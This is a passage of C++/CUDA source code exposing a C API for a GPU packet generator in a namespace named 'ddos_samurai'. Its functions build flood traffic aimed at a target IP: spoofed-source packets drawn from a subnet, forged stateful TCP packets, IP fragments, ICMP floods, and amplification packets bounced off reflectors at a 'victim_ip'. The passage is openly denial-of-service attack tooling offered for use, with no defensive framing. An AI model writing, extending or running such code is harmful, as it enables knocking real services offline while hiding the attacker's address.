    cudaStream_t stream = decode_stream_handle(stream_handle);
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_packets(
            count,
            target,
            target_port,
            proto,
            spoof_ip != 0,
            src,
            tcp_flags,
            has_ethernet != 0,
            window,
            stream,
            gateway_mac,
            subnet);

    return export_packet_result(
        res, "c_api_generate_packets", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_packets_from_template(
    const uint8_t* template_bytes,
    size_t template_len,
    int64_t count,
    const char* real_src_ip,
    int spoof_ip,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    int force_global_fallback,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (!template_bytes || template_len == 0) {
      return set_c_api_error("template_bytes must not be empty");
    }

    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);
    std::vector<uint8_t> tpl(template_bytes, template_bytes + template_len);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_packets_from_template(
            tpl,
            count,
            src,
            spoof_ip != 0,
            has_ethernet != 0,
            stream,
            gateway_mac,
            subnet,
            force_global_fallback != 0);

    return export_packet_result(
        res, "c_api_generate_from_template", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_packets_from_template_pool(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates,
    int64_t count,
    const char* target_ip,
    const char* real_src_ip,
    int spoof_ip,
    int64_t specific_src_port,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    int force_global_fallback,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    const std::vector<std::vector<uint8_t>> templates =
        decode_flat_templates(templates_flat, templates_flat_len, packet_size, num_templates);
    if (templates.empty()) {
      g_samurai_gpu_packet_last_error.clear();
      return 0;
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_packets_from_template_pool(
            templates,
            count,
            target,
            src,
            spoof_ip != 0,
            specific_src_port,
            has_ethernet != 0,
            stream,
            gateway_mac,
            subnet,
            force_global_fallback != 0);

    return export_packet_result(
        res, "c_api_generate_from_template_pool", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_stateful_packets(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates,
    int64_t count,
    const char* target_ip,
    int spoof_ip,
    const char* real_src_ip,
    int64_t specific_src_port,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    const uint32_t* seq_list,
    size_t seq_len,
    const uint32_t* ack_list,
    size_t ack_len,
    const uint8_t* state_list,
    size_t state_len,
    const uint32_t* actual_lengths,
    size_t actual_lengths_len,
    const uint16_t* window_sizes,
    size_t window_sizes_len,
    const uint16_t* mss_values,
    size_t mss_values_len,
    const uint8_t* ttls,
    size_t ttls_len,
    int force_global_fallback,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    const std::vector<std::vector<uint8_t>> templates =
        decode_flat_templates(templates_flat, templates_flat_len, packet_size, num_templates);
    if (templates.empty()) {
      g_samurai_gpu_packet_last_error.clear();
      return 0;
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    const std::vector<uint32_t> seq = vector_from_c_array(seq_list, seq_len, "seq_list");
    const std::vector<uint32_t> ack = vector_from_c_array(ack_list, ack_len, "ack_list");
    const std::vector<uint8_t> state = vector_from_c_array(state_list, state_len, "state_list");
    const std::vector<uint32_t> lengths =
        vector_from_c_array(actual_lengths, actual_lengths_len, "actual_lengths");
    const std::vector<uint16_t> wins =
        vector_from_c_array(window_sizes, window_sizes_len, "window_sizes");
    const std::vector<uint16_t> msss = vector_from_c_array(mss_values, mss_values_len, "mss_values");
    const std::vector<uint8_t> ttlv = vector_from_c_array(ttls, ttls_len, "ttls");

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_stateful_packets(
            templates,
            count,
            target,
            spoof_ip != 0,
            src,
            specific_src_port,
            has_ethernet != 0,
            stream,
            gateway_mac,
            subnet,
            seq,
            ack,
            state,
            lengths,
            wins,
            msss,
            ttlv,
            force_global_fallback != 0);

    return export_packet_result(
        res, "c_api_generate_stateful", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_fragmented_packets(
    const uint8_t* payload_bytes,
    size_t payload_len,
    int64_t count,
    const char* target_ip,
    int64_t target_port,
    const char* protocol,
    int spoof_ip,
    const char* real_src_ip,
    int has_ethernet,
    int64_t frag1_size,
    int64_t frag2_size,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (!payload_bytes && payload_len > 0) {
      return set_c_api_error("payload_bytes pointer is null");
    }
    std::vector<uint8_t> payload;
    if (payload_len > 0) {
      payload.assign(payload_bytes, payload_bytes + payload_len);
    }

    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string proto = protocol ? std::string(protocol) : std::string("udp");
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_fragmented_packets(
            payload,
            count,
            target,
            target_port,
            proto,
            spoof_ip != 0,
            src,
            has_ethernet != 0,
            frag1_size,
            frag2_size,
            stream,
            gateway_mac,
            subnet);

    return export_packet_result(
        res, "c_api_generate_fragmented", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_amplification_packets(
    const uint8_t* template_bytes,
    size_t template_len,
    const char* const* reflectors_ips,
    size_t reflectors_count,
    const char* victim_ip,
    int64_t count,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (!template_bytes || template_len == 0) {
      return set_c_api_error("template_bytes must not be empty");
    }
    if (!reflectors_ips && reflectors_count > 0) {
      return set_c_api_error("reflectors_ips pointer is null");
    }
    const std::string victim = victim_ip ? std::string(victim_ip) : std::string();
    if (victim.empty()) {
      return set_c_api_error("victim_ip must not be empty");
    }

    std::vector<uint8_t> tpl(template_bytes, template_bytes + template_len);
    cudaStream_t stream = decode_stream_handle(stream_handle);
    std::vector<std::string> reflectors;
    reflectors.reserve(reflectors_count);
    for (size_t i = 0; i < reflectors_count; ++i) {
      if (!reflectors_ips[i]) {
        return set_c_api_error("reflectors_ips contains null entry");
      }
      reflectors.emplace_back(reflectors_ips[i]);
    }

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_amplification_packets(
            tpl,
            reflectors,
            victim,
            count,
            has_ethernet != 0,
            stream,
            gateway_mac);

    return export_packet_result(
        res, "c_api_generate_amplification", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_icmp_packets(
    int64_t count,
    const char* target_ip,
    const char* real_src_ip,
    int spoof_ip,
    int has_ethernet,
    int64_t icmp_type,
    int64_t icmp_code,
    int64_t payload_size,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_icmp_packets(
            count,
            target,
            src,
            spoof_ip != 0,
            has_ethernet != 0,
            icmp_type,
            icmp_code,
            payload_size,
            stream,
            gateway_mac,
            subnet);

    return export_packet_result(
        res, "c_api_generate_icmp", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" void samurai_gpu_packet_free(void* ptr) {
  if (!ptr) {
    return;
  }
  auto* payload = static_cast<uint8_t*>(ptr);
  auto* header = reinterpret_cast<ExportHostBufferHeader*>(payload) - 1;
  if (header->magic != kExportHostBufferMagic) {
    std::free(ptr);
    return;
  }
  const auto kind = static_cast<ExportHostAllocKind>(header->alloc_kind);
  if (kind == ExportHostAllocKind::kCudaHost) {
    cudaFreeHost(static_cast<void*>(header));
    return;
  }
  std::free(static_cast<void*>(header));
}

extern "C" const char* samurai_gpu_packet_last_error() {
  return g_samurai_gpu_packet_last_error.c_str();
}
